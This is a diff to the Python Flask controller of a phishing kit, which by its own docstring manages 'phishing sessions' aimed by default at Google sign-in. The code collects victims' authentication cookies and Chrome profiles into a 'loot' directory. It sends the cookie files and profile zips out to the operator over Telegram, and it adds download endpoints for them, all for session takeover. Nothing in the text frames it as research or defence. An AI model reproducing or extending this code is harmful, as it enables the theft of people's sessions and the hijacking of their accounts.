@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 Controller - Central management for phishing sessions
-Handles Telegram notifications and status dashboard
 """
 
 import os
@@ -10,8 +9,8 @@ import asyncio
 import threading
 from datetime import datetime
 from pathlib import Path
-from flask import Flask, request, jsonify, render_template_string
-from telegram_bot import TelegramNotifier
+from flask import Flask, request, jsonify, render_template_string, send_file
+from telegram_bot import get_bot
 
 app = Flask(__name__)
 
@@ -19,12 +18,6 @@ app = Flask(__name__)
 DATA_DIR = Path("/app/data")
 LOOT_DIR = Path("/app/loot")
 SESSIONS_FILE = DATA_DIR / "sessions.json"
-
-# Initialize Telegram notifier
-telegram = TelegramNotifier(
-    bot_token=os.environ.get("TELEGRAM_BOT_TOKEN"),
-    chat_id=os.environ.get("TELEGRAM_CHAT_ID")
-)
 
 # Ensure directories exist
 DATA_DIR.mkdir(parents=True, exist_ok=True)
@@ -45,12 +38,11 @@ def save_sessions(sessions):
         json.dump(sessions, f, indent=2)
 
 
-def send_telegram_async(message, parse_mode="HTML"):
-    """Send Telegram message in background thread"""
-    def _send():
-        asyncio.run(telegram.send_message(message, parse_mode))
-    
-    thread = threading.Thread(target=_send)
+def run_async(coro):
+    """Run async function in background"""
+    def _run():
+        asyncio.run(coro)
+    thread = threading.Thread(target=_run)
     thread.start()
 
 
@@ -233,11 +225,13 @@ def report():
     timestamp = data.get("timestamp", datetime.now().isoformat())
     
     sessions = load_sessions()
+    bot = get_bot()
     
     if session_id not in sessions:
         sessions[session_id] = {
             "status": "active",
             "cookie_count": 0,
+            "auth_count": 0,
             "created": timestamp,
             "last_activity": timestamp,
             "url": f"/view/{session_id}"
@@ -248,57 +242,88 @@ def report():
     
     # Handle different report types
     if report_type == "session_start":
-        message = f"🟢 <b>Session Started</b>\n\n📋 Session: <code>{session_id}</code>\n⏰ Time: {timestamp}"
-        send_telegram_async(message)
+        target = os.environ.get("TARGET_URL", "https://accounts.google.com")
+        run_async(bot.alert_session_start(session_id, target))
     
     elif report_type == "cookies_update":
         count = report_data.get("count", 0)
+        auth_count = report_data.get("auth_count", 0)
         session["cookie_count"] = count
+        session["auth_count"] = auth_count
         
-        if count > 0:
-            message = f"🍪 <b>Cookies Detected</b>\n\n📋 Session: <code>{session_id}</code>\n🔢 Count: {count}"
-            send_telegram_async(message)
+        # Only send if significant (rate limited in bot)
+        if count > 10 or auth_count > 0:
+            run_async(bot.alert_cookies_update(session_id, count, auth_count))
     
     elif report_type == "auth_cookies":
         count = report_data.get("count", 0)
         total = report_data.get("total_cookies", 0)
         cookies = report_data.get("cookies", [])
         
-        session["status"] = "auth"
+        session["status"] = "captured"
         session["cookie_count"] = total
+        session["auth_count"] = count
         session["auth_cookies"] = cookies
         
-        # Format cookie names for message
-        cookie_names = [c["name"] for c in cookies[:5]]
-        cookie_list = "\n".join([f"  • {name}" for name in cookie_names])
-        if len(cookies) > 5:
-            cookie_list += f"\n  ... and {len(cookies) - 5} more"
+        loot_path = str(LOOT_DIR / session_id)
         
-        message = (
-            f"🔐 <b>AUTH COOKIES CAPTURED!</b>\n\n"
-            f"📋 Session: <code>{session_id}</code>\n"
-            f"🎯 Auth Cookies: {count}\n"
-            f"🍪 Total Cookies: {total}\n\n"
-            f"<b>Captured:</b>\n{cookie_list}"
-        )
-        send_telegram_async(message)
+        # Send the important alert with buttons
+        run_async(bot.alert_auth_captured(session_id, total, cookies, loot_path))
+        
+        # Also send the cookies file directly
+        cookies_file = LOOT_DIR / session_id / "cookies.json"
+        if cookies_file.exists():
+            run_async(bot.send_cookies_file(session_id, str(cookies_file)))
     
     elif report_type == "profile_exported":
         path = report_data.get("path", "")
-        session["status"] = "captured"
         session["profile_path"] = path
         
-        message = (
-            f"📦 <b>Profile Exported</b>\n\n"
-            f"📋 Session: <code>{session_id}</code>\n"
-            f"📁 Path: <code>{path}</code>\n\n"
-            f"✅ Ready for session takeover!"
-        )
-        send_telegram_async(message)
+        # Send profile zip
+        if path:
+            run_async(bot.send_profile_zip(session_id, path))
     
     save_sessions(sessions)
     
     return jsonify({"status": "ok"})
+
+
+@app.route("/api/download/<session_id>/cookies")
+def download_cookies(session_id):
+    """Download cookies.json for a session"""
+    cookies_file = LOOT_DIR / session_id / "cookies.json"
+    if cookies_file.exists():
+        return send_file(cookies_file, as_attachment=True, download_name=f"{session_id}_cookies.json")
+    return jsonify({"error": "Not found"}), 404
+
+
+@app.route("/api/download/<session_id>/profile")
+def download_profile(session_id):
+    """Download zipped profile for a session"""
+    import zipfile
+    import tempfile
+    
+    session_dir = LOOT_DIR / session_id
+    if not session_dir.exists():
+        return jsonify({"error": "Not found"}), 404
+    
+    # Find latest profile
+    profiles = list(session_dir.glob("chrome_profile_*"))
+    if not profiles:
+        return jsonify({"error": "No profile found"}), 404
+    
+    profile_dir = sorted(profiles)[-1]
+    
+    # Create zip
+    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
+        zip_path = tmp.name
+    
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for file in profile_dir.rglob('*'):
+            if file.is_file():
+                zf.write(file, file.relative_to(profile_dir))
+    
+    return send_file(zip_path, as_attachment=True, download_name=f"{session_id}_profile.zip")
 
 
 @app.route("/api/sessions")
